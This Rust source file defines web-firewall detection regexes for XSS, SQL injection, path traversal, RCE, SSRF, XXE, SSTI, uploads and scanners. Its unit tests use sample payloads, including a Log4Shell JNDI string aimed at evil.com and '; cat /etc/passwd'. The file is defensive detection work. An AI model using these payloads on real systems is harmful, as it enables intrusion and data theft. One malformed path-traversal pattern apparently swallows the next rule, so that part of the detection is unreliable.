use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::HashMap;

pub static RAW_RULES: &[(&str, &[&str])] = &[
    (
        "xss",
        &[
            r#"<script[\s\S]*?>"#,
            r#"</script>"#,
            r#"javascript\s*:"#,
            r#"vbscript\s*:"#,
            r#"on(load|error|click|mouseover|focus|blur|change|submit|keyup|keydown|input|mousewheel|contextmenu|drag|drop)\s*="#,
            r#"<iframe[\s\S]*?>"#,
            r#"<img[^>]+src\s*=\s*['\"]?\s*javascript:"#,
            r#"<svg[\s\S]*?on\w+\s*="#,
            r#"<object[\s\S]*?>"#,
            r#"<embed[\s\S]*?>"#,
            r#"<link[^>]+href[^>]+stylesheet"#,
            r#"expression\s*\("#,
            r#"(alert|confirm|prompt|eval|atob|execCommand|setTimeout|setInterval)\s*[(`]"#,
            r#"document\s*\.\s*(cookie|write|location|domain)"#,
            r#"window\s*\.\s*(location|name|open|eval)"#,
            r#"String\.fromCharCode"#,
            r#"&#x[0-9a-f]+;"#,
            r#"&#\d+;"#,
            r#"%3cscript"#,
            r#"%3e"#,
            r#"data\s*:\s*text/html"#,
            r#"base64\s*,"#,
            r#"location\s*=\s*['\"]javascript:"#,
        ],
    ),
    (
        "sql_injection",
        &[
            r#"'\s*(or|and)\s*'?\d"#,
            r#"'\s*(or|and)\s+\d+\s*=\s*\d+"#,
            r#"union\s+(all\s+)?select"#,
            r#"select\s+.+?\s+from\s+"#,
            r#"insert\s+into\s+"#,
            r#"update\s+\w+\s+set\s+"#,
            r#"delete\s+from\s+"#,
            r#"drop\s+(table|database|index|view)"#,
            r#"alter\s+(table|database)"#,
            r#"create\s+(table|database|index|view)"#,
            r#"exec(\s|\+)+(s|x)p\w+"#,
            r#"xp_cmdshell"#,
            r#"information_schema"#,
            r#"sys\.(tables|columns|objects)"#,
            r#"sleep\s*\(\s*\d+\s*\)"#,
            r#"benchmark\s*\("#,
            r#"waitfor\s+delay"#,
            r#"load_file\s*\("#,
            r#"into\s+(out|dump)file"#,
            r#"--\s"#,
            r#";\s*--"#,
            r#"/\*.*?\*/"#,
            r#"(#|--)\s*$"#,
            r#"0x[0-9a-f]{4,}"#,
            r#"char\s*\(\s*\d+"#,
            r#"concat\s*\("#,
            r#"group_concat\s*\("#,
            r#"(extractvalue|updatexml|floor|geometrycollection|multipoint|polygon)\s*\("#,
            r#"procedure\s+analyse\s*\("#,
            r#"select\s+pg_sleep"#,
            r#"dbms_pipe\.receive_message"#,
        ],
    ),
    (
        "path_traversal",
        &[
            r#"\.\./"#,
            r#"\.\.\\\"#,
            r#"%2e%2e%2f"#,
            r#"%2e%2e/"#,
            r#"\.\.%2f"#,
            r#"%252e%252e"#,
            r#"etc/passwd"#,
            r#"etc/shadow"#,
            r#"etc/hosts"#,
            r#"proc/self/environ"#,
            r#"proc/self/cmdline"#,
            r#"windows/system32"#,
            r#"win\.ini"#,
            r#"boot\.ini"#,
            r#"/var/log/"#,
            r#"\.htaccess"#,
            r#"\.env"#,
            r#"wp-config\.php"#,
            r#"web\.config"#,
            r#"\.git/config"#,
            r#"\.DS_Store"#,
            r#"WEB-INF/"#,
            r#"META-INF/"#,
            r#"appsettings\.json"#,
        ],
    ),
    (
        "rce",
        &[
            r#"(?:^|[;\|&])\s*(ls|dir|pwd|whoami|id|uname|cat|wget|curl|bash|sh|python|perl|ruby|php|node|powershell|cmd)\s+"#,
            r#"system\s*\("#,
            r#"passthru\s*\("#,
            r#"shell_exec\s*\("#,
            r#"popen\s*\("#,
            r#"proc_open\s*\("#,
            r#"exec\s*\("#,
            r#"assert\s*\("#,
            r#"preg_replace\s*\(.+/e"#,
            r#"call_user_func\s*\("#,
            r#"base64_decode\s*\("#,
            r#"file_get_contents\s*\("#,
            r#"include\s*\("#,
            r#"require\s*\("#,
            r#"phpinfo\s*\("#,
            r#"nc\s+-[el]"#,
            r#"/bin/(bash|sh|zsh|ksh)"#,
            r#"python\s+-c\s+['\"]import"#,
            r#"curl\s+.+\|\s*(bash|sh)"#,
            r#"java\.lang\.Runtime"#,
            r#"ProcessBuilder"#,
            r#"getRuntime\(\)\.exec"#,
            r#"\$\(\w+\)"#,
            r#"`\w+`"#,
            r#"\$\{jndi:(?:ldap|rmi|dns|nis|iiop|corba|nds|http):.*?\}"#,
            r#"class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.pattern"#,
        ],
    ),
    (
        "ssrf",
        &[
            r#"http://169\.254\.169\.254"#,
            r#"http://metadata\.google\.internal"#,
            r#"http://192\.168\."#,
            r#"http://10\."#,
            r#"http://172\.(1[6-9]|2\d|3[01])\."#,
            r#"http://0\.0\.0\.0"#,
            r#"file://"#,
            r#"dict://"#,
            r#"gopher://"#,
            r#"ftp://"#,
            r#"sftp://"#,
            r#"ldap://"#,
            r#"tftp://"#,
            r#"jar://"#,
            r#"netdoc://"#,
            r#"0x7f000001"#,
            r#"2130706433"#,
        ],
    ),
    (
        "xxe",
        &[
            r#"<!ENTITY"#,
            r#"<!DOCTYPE[^>]+SYSTEM"#,
            r#"<!DOCTYPE[^>]+PUBLIC"#,
            r#"SYSTEM\s+['\"]file://"#,
            r#"SYSTEM\s+['\"]http://"#,
            r#"%[a-z]+;"#,
            r#"<!\[CDATA\["#,
        ],
    ),
    (
        "ssti",
        &[
            r#"\{\{.*?\}\}"#,
            r#"\{%.*?%\}"#,
            r#"\$\{.*?\}"#,
            r#"#\{.*?\}"#,
            r#"\{\{7\*7\}\}"#,
            r#"__class__"#,
            r#"__mro__"#,
            r#"__subclasses__"#,
            r#"__import__"#,
            r#"__builtins__"#,
            r#"mako\.runtime"#,
            r#"jinja2\.environment"#,
        ],
    ),
    (
        "file_upload",
        &[
            r#"\.(php|php3|php4|php5|phtml|phar|jsp|jspx|jspf|asp|aspx|asa|cer|cdx|exe|sh|pl|py|cgi)\s*$"#,
            r#"Content-Type.*application/x-php"#,
            r#"GIF89a.*<\?php"#,
            r#"<\?php"#,
            r#"<%@\s*page"#,
            r#"<%\s*Runtime"#,
        ],
    ),
    (
        "scanner",
        &[
            r#"sqlmap"#,
            r#"nmap"#,
            r#"nikto"#,
            r#"burpsuite"#,
            r#"acunetix"#,
            r#"nessus"#,
            r#"openvas"#,
            r#"masscan"#,
            r#"zgrab"#,
            r#"nuclei"#,
            r#"dirsearch"#,
            r#"gobuster"#,
            r#"hydra"#,
            r#"wpscan"#,
            r#"skipfish"#,
            r#"python-requests/"#,
            r#"go-http-client"#,
            r#"postmanruntime"#,
        ],
    ),
];

pub static COMPILED_RULES: Lazy<HashMap<&'static str, Regex>> = Lazy::new(|| {
    let mut compiled = HashMap::new();
    for &(attack_type, patterns) in RAW_RULES.iter() {
        let combined = patterns.join("|");
        match Regex::new(&format!("(?i){}", combined)) {
            Ok(re) => {
                compiled.insert(attack_type, re);
            }
            Err(e) => {
                tracing::error!(
                    "Rule compilation failed for category {}: {}",
                    attack_type,
                    e
                );
            }
        }
    }
    compiled
});

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_compiled_rules_not_empty() {
        assert!(!COMPILED_RULES.is_empty());
        assert_eq!(COMPILED_RULES.len(), RAW_RULES.len());
    }

    #[test]
    fn test_xss_detection() {
        let pattern = &COMPILED_RULES["xss"];
        assert!(pattern.is_match("<script>alert(1)</script>"));
    }

    #[test]
    fn test_sql_injection_detection() {
        let pattern = &COMPILED_RULES["sql_injection"];
        assert!(pattern.is_match("' OR 1=1 --"));
    }

    #[test]
    fn test_path_traversal_detection() {
        let pattern = &COMPILED_RULES["path_traversal"];
        assert!(pattern.is_match("../../../etc/passwd"));
    }

    #[test]
    fn test_rce_detection() {
        let pattern = &COMPILED_RULES["rce"];
        assert!(pattern.is_match("; cat /etc/passwd"));
    }

    #[test]
    fn test_ssrf_detection() {
        let pattern = &COMPILED_RULES["ssrf"];
        assert!(pattern.is_match("http://169.254.169.254/latest/meta-data/"));
    }

    #[test]
    fn test_xxe_detection() {
        let pattern = &COMPILED_RULES["xxe"];
        assert!(pattern.is_match("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
    }

    #[test]
    fn test_ssti_detection() {
        let pattern = &COMPILED_RULES["ssti"];
        assert!(pattern.is_match("{{7*7}}"));
    }

    #[test]
    fn test_file_upload_detection() {
        let pattern = &COMPILED_RULES["file_upload"];
        assert!(pattern.is_match("shell.php"));
    }

    #[test]
    fn test_scanner_detection() {
        let pattern = &COMPILED_RULES["scanner"];
        assert!(pattern.is_match("sqlmap/1.0"));
    }

    #[test]
    fn test_normal_request() {
        for (_, pattern) in COMPILED_RULES.iter() {
            assert!(!pattern.is_match("hello world this is a normal request"));
        }
    }

    #[test]
    fn test_case_insensitive() {
        let pattern = &COMPILED_RULES["xss"];
        assert!(pattern.is_match("<SCRIPT>ALERT(1)</SCRIPT>"));
    }

    #[test]
    fn test_log4shell() {
        let pattern = &COMPILED_RULES["rce"];
        assert!(pattern.is_match("${jndi:ldap://evil.com/a}"));
    }

    #[test]
    fn test_springshell() {
        let pattern = &COMPILED_RULES["rce"];
        assert!(pattern.is_match("class.module.classLoader.resources.context.parent.pipeline.first.pattern"));
    }

    #[test]
    fn test_union_select() {
        let pattern = &COMPILED_RULES["sql_injection"];
        assert!(pattern.is_match("UNION SELECT 1,2,3--"));
    }

    #[test]
    fn test_multiple_attack_types() {
        let text = "<script> UNION SELECT 1,2,3--";
        assert!(COMPILED_RULES["xss"].is_match(text));
        assert!(COMPILED_RULES["sql_injection"].is_match(text));
    }
}
